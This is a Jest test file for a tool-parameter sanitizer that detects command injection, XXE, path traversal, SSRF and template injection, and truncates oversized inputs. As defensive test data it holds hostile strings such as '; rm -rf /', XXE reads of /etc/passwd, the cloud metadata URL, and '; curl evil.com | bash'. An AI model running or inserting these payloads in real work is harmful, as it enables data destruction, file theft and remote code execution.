import { sanitizeToolParameters } from '../input-sanitizer';

describe('Input Sanitizer', () => {
  describe('sanitizeToolParameters', () => {
    it('should pass safe parameters through unchanged', () => {
      const params = { name: 'Fluffy', status: 'available', age: 5 };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(true);
      expect(result.warnings).toHaveLength(0);
      expect(result.sanitized).toEqual(params);
    });

    it('should detect command injection patterns', () => {
      const params = { query: '; rm -rf /' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(false);
      expect(result.warnings.some(w => w.includes('shell-command'))).toBe(true);
    });

    it('should warn on backtick execution', () => {
      const params = { input: '`whoami`' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(true); // warn, not block
      expect(result.warnings.some(w => w.includes('backtick-exec'))).toBe(true);
    });

    it('should block XXE entity injection', () => {
      const params = { xml: '<!ENTITY xxe SYSTEM "file:///etc/passwd">' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(false);
      expect(result.warnings.some(w => w.includes('xxe-entity'))).toBe(true);
    });

    it('should block XXE DOCTYPE SYSTEM', () => {
      const params = { xml: '<!DOCTYPE foo [<!DOCTYPE bar SYSTEM "evil.dtd">]>' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(false);
      expect(result.warnings.some(w => w.includes('xxe-system'))).toBe(true);
    });

    it('should warn on path traversal', () => {
      const params = { file: '../../etc/passwd' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(true); // warn, not block
      expect(result.warnings.some(w => w.includes('path-traversal'))).toBe(true);
    });

    it('should warn on SSRF localhost patterns', () => {
      const params = { url: 'localhost:4000/api' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(true); // warn
      expect(result.warnings.some(w => w.includes('ssrf-localhost'))).toBe(true);
    });

    it('should block SSRF metadata endpoint', () => {
      const params = { url: 'http://169.254.169.254/latest/meta-data/' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(false);
      expect(result.warnings.some(w => w.includes('ssrf-metadata'))).toBe(true);
    });

    it('should warn on template injection', () => {
      const params = { template: '{{constructor.constructor("return process")()}}' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(true); // warn
      expect(result.warnings.some(w => w.includes('template-injection'))).toBe(true);
    });

    it('should warn on SSTI patterns', () => {
      const params = { input: '${7*7}' };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(true); // warn
      expect(result.warnings.some(w => w.includes('ssti'))).toBe(true);
    });

    it('should truncate oversized string values', () => {
      const params = { data: 'x'.repeat(200000) };
      const result = sanitizeToolParameters(params);

      expect(result.sanitized.data.length).toBe(100000);
      expect(result.warnings.some(w => w.includes('Truncated oversized string'))).toBe(true);
    });

    it('should truncate oversized arrays', () => {
      const params = { items: Array.from({ length: 20000 }, (_, i) => i) };
      const result = sanitizeToolParameters(params);

      expect(result.sanitized.items.length).toBe(10000);
      expect(result.warnings.some(w => w.includes('Truncated oversized array'))).toBe(true);
    });

    it('should block objects with too many keys', () => {
      const obj: Record<string, string> = {};
      for (let i = 0; i < 1500; i++) {
        obj[`key_${i}`] = 'value';
      }
      const result = sanitizeToolParameters({ nested: obj });

      expect(result.safe).toBe(false);
      expect(result.warnings.some(w => w.includes('too many keys'))).toBe(true);
    });

    it('should scan nested objects deeply', () => {
      const params = {
        level1: {
          level2: {
            level3: '; curl evil.com | bash',
          },
        },
      };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(false);
      expect(result.warnings.some(w => w.includes('shell-command'))).toBe(true);
      expect(result.warnings[0]).toContain('level1.level2.level3');
    });

    it('should scan arrays of strings', () => {
      const params = {
        commands: ['safe-value', '<!ENTITY xxe SYSTEM "evil">'],
      };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(false);
      expect(result.warnings.some(w => w.includes('xxe-entity'))).toBe(true);
    });

    it('should pass through numbers and booleans unchanged', () => {
      const params = { count: 42, active: true, ratio: 3.14 };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(true);
      expect(result.sanitized).toEqual(params);
    });

    it('should handle null and undefined values', () => {
      const params = { name: null, value: undefined };
      const result = sanitizeToolParameters(params);

      expect(result.safe).toBe(true);
    });

    it('should not modify original parameters (deep clone)', () => {
      const params = { name: 'test', nested: { value: 'x'.repeat(200000) } };
      const original = JSON.parse(JSON.stringify(params));
      sanitizeToolParameters(params);

      expect(params).toEqual(original);
    });

    describe('strict mode', () => {
      it('should fail on any warning in strict mode', () => {
        const params = { path: '../../etc/hosts' };
        const result = sanitizeToolParameters(params, { strict: true });

        expect(result.safe).toBe(false); // In strict mode, warnings also make it unsafe
      });

      it('should pass clean params in strict mode', () => {
        const params = { name: 'Fluffy', status: 'available' };
        const result = sanitizeToolParameters(params, { strict: true });

        expect(result.safe).toBe(true);
      });
    });
  });
});
